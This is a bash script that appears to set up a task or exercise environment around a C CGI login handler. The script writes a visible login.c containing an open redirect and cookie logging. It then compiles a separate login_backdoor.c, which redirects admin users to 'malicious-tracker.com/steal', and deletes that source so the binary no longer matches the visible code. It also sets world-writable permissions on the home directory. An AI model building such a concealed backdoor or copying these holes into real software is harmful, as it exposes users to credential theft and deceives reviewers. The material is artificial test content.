#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip gcc
    pip3 install pytest

    mkdir -p /home/user/workspace
    cd /home/user/workspace

    cat << 'EOF' > login.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *query = getenv("QUERY_STRING");
    char *cookie = getenv("HTTP_COOKIE");
    char next_url[256] = "/index.html";

    if (query != NULL && strncmp(query, "next=", 5) == 0) {
        strncpy(next_url, query + 5, 255);
    }

    printf("Location: %s\n\n", next_url);

    FILE *log = fopen("audit.log", "a");
    if (log) {
        fprintf(log, "Login attempt. Cookie: %s\n", cookie ? cookie : "None");
        fclose(log);
    }
    return 0;
}
EOF

    cat << 'EOF' > login_backdoor.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *query = getenv("QUERY_STRING");
    char *cookie = getenv("HTTP_COOKIE");
    char *user = getenv("USER_ROLE");
    char next_url[256] = "/index.html";

    if (user != NULL && strcmp(user, "admin") == 0) {
        strcpy(next_url, "http://malicious-tracker.com/steal");
    } else if (query != NULL && strncmp(query, "next=", 5) == 0) {
        strncpy(next_url, query + 5, 255);
    }

    printf("Location: %s\n\n", next_url);

    FILE *log = fopen("audit.log", "a");
    if (log) {
        fprintf(log, "Login attempt. Cookie: %s\n", cookie ? cookie : "None");
        fclose(log);
    }
    return 0;
}
EOF

    gcc -o login.cgi login_backdoor.c
    rm login_backdoor.c

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
